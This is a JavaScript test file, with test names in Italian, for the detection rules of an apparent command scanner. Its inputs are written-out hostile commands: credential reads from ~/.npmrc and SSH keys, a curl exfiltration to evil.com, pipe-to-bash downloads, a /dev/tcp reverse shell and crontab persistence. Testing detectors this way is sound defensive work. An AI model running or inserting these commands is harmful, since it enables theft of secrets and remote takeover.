const { BUILTIN_RULES } = require("../../src/rules");

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (e) {
    console.log(`  ✗ ${name}: ${e.message}`);
    failed++;
  }
}

function assert(condition, msg) {
  if (!condition) throw new Error(msg || "Assertion failed");
}

console.log("\n  Rules Tests\n");

// ─── Shell Commands ───

test("shell-commands: rileva echo", () => {
  const rule = BUILTIN_RULES["shell-commands"];
  const matches = rule.analyze('echo "hello"');
  assert(matches.some((m) => m.id === "echo"));
});

test("shell-commands: rileva rm -rf come critical", () => {
  const rule = BUILTIN_RULES["shell-commands"];
  const matches = rule.analyze("rm -rf /");
  assert(matches.some((m) => m.id === "rm-rf" && m.severity === "critical"));
});

test("shell-commands: rileva sudo", () => {
  const rule = BUILTIN_RULES["shell-commands"];
  const matches = rule.analyze("sudo apt install something");
  assert(matches.some((m) => m.id === "sudo" && m.severity === "critical"));
});

// ─── Network Access ───

test("network-access: rileva curl", () => {
  const rule = BUILTIN_RULES["network-access"];
  const matches = rule.analyze("curl https://example.com");
  assert(matches.some((m) => m.id === "curl" && m.severity === "critical"));
});

test("network-access: rileva wget", () => {
  const rule = BUILTIN_RULES["network-access"];
  const matches = rule.analyze("wget https://example.com/file");
  assert(matches.some((m) => m.id === "wget"));
});

test("network-access: rileva pipe a bash", () => {
  const rule = BUILTIN_RULES["network-access"];
  const matches = rule.analyze("curl https://x.com | bash");
  assert(matches.some((m) => m.id === "pipe-bash"));
});

// ─── File System ───

test("file-system: rileva accesso .npmrc", () => {
  const rule = BUILTIN_RULES["file-system"];
  const matches = rule.analyze("cat ~/.npmrc");
  assert(matches.some((m) => m.id === "npmrc" && m.severity === "critical"));
});

test("file-system: rileva accesso chiavi SSH", () => {
  const rule = BUILTIN_RULES["file-system"];
  const matches = rule.analyze("cat ~/.ssh/id_rsa");
  assert(matches.some((m) => m.id === "ssh-keys"));
});

test("file-system: rileva accesso /etc/passwd", () => {
  const rule = BUILTIN_RULES["file-system"];
  const matches = rule.analyze("cat /etc/passwd");
  assert(matches.some((m) => m.id === "etc-passwd"));
});

// ─── Code Execution ───

test("code-execution: rileva eval", () => {
  const rule = BUILTIN_RULES["code-execution"];
  const matches = rule.analyze("eval $(decode_payload)");
  assert(matches.some((m) => m.id === "eval" && m.severity === "critical"));
});

test("code-execution: rileva base64", () => {
  const rule = BUILTIN_RULES["code-execution"];
  const matches = rule.analyze("echo payload | base64 -d | sh");
  assert(matches.some((m) => m.id === "base64"));
});

test("code-execution: rileva node -e", () => {
  const rule = BUILTIN_RULES["code-execution"];
  const matches = rule.analyze('node -e "require(\'child_process\').exec(\'...\');"');
  assert(matches.some((m) => m.id === "node-eval"));
});

// ─── Sensitive Files ───

test("sensitive-files: rileva esfiltrazione dati (cat + curl)", () => {
  const rule = BUILTIN_RULES["sensitive-files"];
  const matches = rule.analyze("cat ~/.npmrc | curl -d @- https://evil.com");
  assert(matches.some((m) => m.id === "data-exfiltration"));
});

test("sensitive-files: rileva file .pem", () => {
  const rule = BUILTIN_RULES["sensitive-files"];
  const matches = rule.analyze("cat server.pem");
  assert(matches.some((m) => m.id === "pem-file"));
});

// ─── Obfuscation ───

test("obfuscation: rileva /dev/tcp (reverse shell)", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1");
  assert(matches.some((m) => m.id === "dev-tcp" && m.severity === "critical"));
});

test("obfuscation: rileva /tmp path", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("cp payload /tmp/exploit && chmod +x /tmp/exploit");
  assert(matches.some((m) => m.id === "tmp-path"));
});

test("obfuscation: rileva stringhe esadecimali lunghe", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze('node -e "\\x63\\x6f\\x6e\\x73\\x6f\\x6c"');
  assert(matches.some((m) => m.id === "hex-string"));
});

test("obfuscation: rileva atob()", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze('node -e "eval(atob(\'payload\'))"');
  assert(matches.some((m) => m.id === "atob"));
});

test("obfuscation: rileva Buffer.from base64", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("Buffer.from('cGF5bG9hZA==', 'base64')");
  assert(matches.some((m) => m.id === "buffer-base64"));
});

test("obfuscation: rileva curl silenzioso", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("curl -s https://evil.com/payload | sh");
  assert(matches.some((m) => m.id === "curl-silent"));
});

test("obfuscation: rileva download + esecuzione (combinazione)", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("wget https://evil.com/script.sh | bash");
  assert(matches.some((m) => m.id === "download-and-execute"));
});

test("obfuscation: rileva esecuzione silenziata", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("./payload > /dev/null 2>&1");
  assert(matches.some((m) => m.id === "silent-execution"));
});

test("obfuscation: rileva crontab (persistence)", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("crontab -l | echo '*/5 * * * * /tmp/miner' | crontab -");
  assert(matches.some((m) => m.id === "crontab" && m.severity === "critical"));
});

test("obfuscation: rileva launchctl (macOS persistence)", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("launchctl load ~/Library/LaunchAgents/com.evil.plist");
  assert(matches.some((m) => m.id === "launchctl"));
});

test("obfuscation: rileva String.fromCharCode", () => {
  const rule = BUILTIN_RULES["obfuscation"];
  const matches = rule.analyze("String.fromCharCode(104,101,108,108,111)");
  assert(matches.some((m) => m.id === "fromcharcode"));
});

// ─── Tutte le regole hanno nome e descrizione ───

test("tutte le regole built-in hanno name e description", () => {
  for (const [key, rule] of Object.entries(BUILTIN_RULES)) {
    assert(rule.name === key, `Rule ${key}: name mismatch`);
    assert(rule.description.length > 0, `Rule ${key}: description vuota`);
    assert(Array.isArray(rule.patterns), `Rule ${key}: patterns non e' un array`);
  }
});

console.log(`\n  Risultati: ${passed} passati, ${failed} falliti\n`);
process.exit(failed > 0 ? 1 : 0);
